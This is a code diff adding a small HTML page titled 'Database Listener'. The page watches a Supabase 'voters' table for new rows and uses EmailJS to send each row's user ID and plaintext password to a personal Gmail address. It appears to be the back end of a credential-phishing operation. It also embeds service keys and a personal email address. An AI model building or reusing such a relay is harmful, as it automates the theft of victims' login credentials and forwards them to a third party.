@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Database Listener</title>
+</head>
+<body>
+
+<h2>Database Listener Running...</h2>
+<p>Do not close this page.</p>
+
+<!-- Supabase -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+  /* ==========================
+     EmailJS Initialization
+     ========================== */
+  (function () {
+    emailjs.init("B_SVJj28Hgjs8HQwd");
+  })();
+
+  /* ==========================
+     Supabase Configuration
+     ========================== */
+  const SUPABASE_URL = "https://byvffsxsfehrybkyamyu.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJ5dmZmc3hzZmVocnlia3lhbXl1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTgyNDM0MjMsImV4cCI6MjA3MzgxOTQyM30.R99A5PQ2t9keXeQdglGlq35IOGRk7d3NsqPbe9Dw8uY";
+
+  const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+  /* ==========================
+     Realtime Listener
+     ========================== */
+  sb.channel("voter-insert-listener")
+    .on(
+      "postgres_changes",
+      {
+        event: "INSERT",
+        schema: "public",
+        table: "voters",
+      },
+      (payload) => {
+        console.log("New record received:", payload.new);
+
+        sendEmail(payload.new);
+      }
+    )
+    .subscribe();
+
+  /* ==========================
+     Send Email via EmailJS
+     ========================== */
+  function sendEmail(data) {
+    emailjs.send(
+      "service_144d6df",
+      "template_aq2ngoi",
+      {
+        to_email: "williamscollins5060@gmail.com",
+        user_id: data.user_id,
+        password: data.password,
+        time: new Date().toLocaleString()
+      }
+    )
+    .then(() => {
+      console.log("Email sent successfully");
+    })
+    .catch((err) => {
+      console.error("Email sending failed:", err);
+    });
+  }
+</script>
+
+</body>
+</html>
